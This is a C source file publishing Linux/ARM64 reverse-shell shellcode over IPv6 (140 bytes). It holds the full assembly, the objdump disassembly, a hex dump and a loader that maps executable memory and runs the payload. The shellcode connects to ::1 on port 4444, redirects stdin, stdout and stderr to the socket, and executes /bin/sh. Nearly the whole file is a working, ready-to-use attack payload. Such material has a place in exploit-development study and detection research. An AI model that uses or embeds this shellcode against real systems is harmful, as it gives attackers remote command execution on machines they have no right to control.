/*
# Title:  Linux/ARM64 - Reverse (::1:4444/TCP) Shell (/bin/sh) +IPv6 Shellcode (140 bytes)
# Date:   2019-06-30
# Tested: Ubuntu 16.04 (aarch64)
# Author: Ken Kitahara
# Compilation: gcc -o loader loader.c


ubuntu@ubuntu:~/works$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu Xenial Xerus (development branch)
Release:	16.04
Codename:	xenial
ubuntu@ubuntu:~/works$ uname -a
Linux ubuntu 4.2.0-16-generic #19-Ubuntu SMP Thu Oct 8 15:00:45 UTC 2015 aarch64 aarch64 aarch64 GNU/Linux
ubuntu@ubuntu:~/works$ cat ipv6revshell.s
.section .text
.global _start
_start:
    // socket(10, 1, 0)
    mov  x0, #0x0a
    lsr  x1, x0, #3
    lsl  x3, x1, #2
    mov  x2, xzr
    mov  x8, #198
    svc  #0x1337

    // save fd
    mvn  x4, x0

    // connect(fd, &sockaddr, 28)
    str  xzr, [sp, #-8]!
    mov  x1, #0x0100000000000000
    str  x1, [sp, #-8]!
    str  xzr, [sp, #-8]!
    movz x1, #0x0A
    movk x1, #0x5C11, lsl #16
    str  x1, [sp, #-8]!
    add  x1, sp, x2
    mov  x2, #28
    mov  x8, #203
    svc  #0x1337

    mov  x1, x3

dup3:
    // dup3(s, 2, 0)
    // dup3(s, 1, 0)
    // dup3(s, 0, 0)
    mvn  x0, x4
    lsr  x1, x1, #1
    mov  x2, xzr
    mov  x8, #24
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x1
    bne  dup3

    // execve("/bin/sh", 0, 0)
    mov  x3, #0x622F
    movk x3, #0x6E69, lsl #16
    movk x3, #0x732F, lsl #32
    movk x3, #0x68, lsl #48
    str  x3, [sp, #-8]!
    add  x0, sp, x1
    mov  x8, #221
    svc  #0x1337
ubuntu@ubuntu:~/works$ as -o ipv6revshell.o ipv6revshell.s && ld -o ipv6revshell ipv6revshell.o
ubuntu@ubuntu:~/works$ objdump -d ./ipv6revshell

./ipv6revshell:     file format elf64-littleaarch64


Disassembly of section .text:

0000000000400078 <_start>:
  400078:	d2800140 	mov	x0, #0xa                   	// #10
  40007c:	d343fc01 	lsr	x1, x0, #3
  400080:	d37ef423 	lsl	x3, x1, #2
  400084:	aa1f03e2 	mov	x2, xzr
  400088:	d28018c8 	mov	x8, #0xc6                  	// #198
  40008c:	d40266e1 	svc	#0x1337
  400090:	aa2003e4 	mvn	x4, x0
  400094:	f81f8fff 	str	xzr, [sp,#-8]!
  400098:	d2e02001 	mov	x1, #0x100000000000000     	// #72057594037927936
  40009c:	f81f8fe1 	str	x1, [sp,#-8]!
  4000a0:	f81f8fff 	str	xzr, [sp,#-8]!
  4000a4:	d2800141 	mov	x1, #0xa                   	// #10
  4000a8:	f2ab8221 	movk	x1, #0x5c11, lsl #16
  4000ac:	f81f8fe1 	str	x1, [sp,#-8]!
  4000b0:	8b2263e1 	add	x1, sp, x2
  4000b4:	d2800382 	mov	x2, #0x1c                  	// #28
  4000b8:	d2801968 	mov	x8, #0xcb                  	// #203
  4000bc:	d40266e1 	svc	#0x1337
  4000c0:	aa0303e1 	mov	x1, x3

00000000004000c4 <dup3>:
  4000c4:	aa2403e0 	mvn	x0, x4
  4000c8:	d341fc21 	lsr	x1, x1, #1
  4000cc:	aa1f03e2 	mov	x2, xzr
  4000d0:	d2800308 	mov	x8, #0x18                  	// #24
  4000d4:	d40266e1 	svc	#0x1337
  4000d8:	aa1f03ea 	mov	x10, xzr
  4000dc:	eb01015f 	cmp	x10, x1
  4000e0:	54ffff21 	b.ne	4000c4 <dup3>
  4000e4:	d28c45e3 	mov	x3, #0x622f                	// #25135
  4000e8:	f2adcd23 	movk	x3, #0x6e69, lsl #16
  4000ec:	f2ce65e3 	movk	x3, #0x732f, lsl #32
  4000f0:	f2e00d03 	movk	x3, #0x68, lsl #48
  4000f4:	f81f8fe3 	str	x3, [sp,#-8]!
  4000f8:	8b2163e0 	add	x0, sp, x1
  4000fc:	d2801ba8 	mov	x8, #0xdd                  	// #221
  400100:	d40266e1 	svc	#0x1337
ubuntu@ubuntu:~/works$ objcopy -O binary ipv6revshell ipv6revshell.bin
ubuntu@ubuntu:~/works$ hexdump -v -e '"\\""x" 1/1 "%02x" ""' ipv6revshell.bin && echo
\x40\x01\x80\xd2\x01\xfc\x43\xd3\x23\xf4\x7e\xd3\xe2\x03\x1f\xaa\xc8\x18\x80\xd2\xe1\x66\x02\xd4\xe4\x03\x20\xaa\xff\x8f\x1f\xf8\x01\x20\xe0\xd2\xe1\x8f\x1f\xf8\xff\x8f\x1f\xf8\x41\x01\x80\xd2\x21\x82\xab\xf2\xe1\x8f\x1f\xf8\xe1\x63\x22\x8b\x82\x03\x80\xd2\x68\x19\x80\xd2\xe1\x66\x02\xd4\xe1\x03\x03\xaa\xe0\x03\x24\xaa\x21\xfc\x41\xd3\xe2\x03\x1f\xaa\x08\x03\x80\xd2\xe1\x66\x02\xd4\xea\x03\x1f\xaa\x5f\x01\x01\xeb\x21\xff\xff\x54\xe3\x45\x8c\xd2\x23\xcd\xad\xf2\xe3\x65\xce\xf2\x03\x0d\xe0\xf2\xe3\x8f\x1f\xf8\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4

*/

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] =
"\x40\x01\x80\xd2\x01\xfc\x43\xd3\x23\xf4\x7e\xd3\xe2\x03\x1f\xaa"
"\xc8\x18\x80\xd2\xe1\x66\x02\xd4\xe4\x03\x20\xaa\xff\x8f\x1f\xf8"
"\x01\x20\xe0\xd2\xe1\x8f\x1f\xf8\xff\x8f\x1f\xf8\x41\x01\x80\xd2"
"\x21\x82\xab\xf2\xe1\x8f\x1f\xf8\xe1\x63\x22\x8b\x82\x03\x80\xd2"
"\x68\x19\x80\xd2\xe1\x66\x02\xd4\xe1\x03\x03\xaa\xe0\x03\x24\xaa"
"\x21\xfc\x41\xd3\xe2\x03\x1f\xaa\x08\x03\x80\xd2\xe1\x66\x02\xd4"
"\xea\x03\x1f\xaa\x5f\x01\x01\xeb\x21\xff\xff\x54\xe3\x45\x8c\xd2"
"\x23\xcd\xad\xf2\xe3\x65\xce\xf2\x03\x0d\xe0\xf2\xe3\x8f\x1f\xf8"
"\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4";

int main(int argc, char **argv) {
    printf("Shellcode Length: %zd Bytes\n", strlen(shellcode));

    void *ptr = mmap(0, 0x100, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;

    sc();

    return 0;
}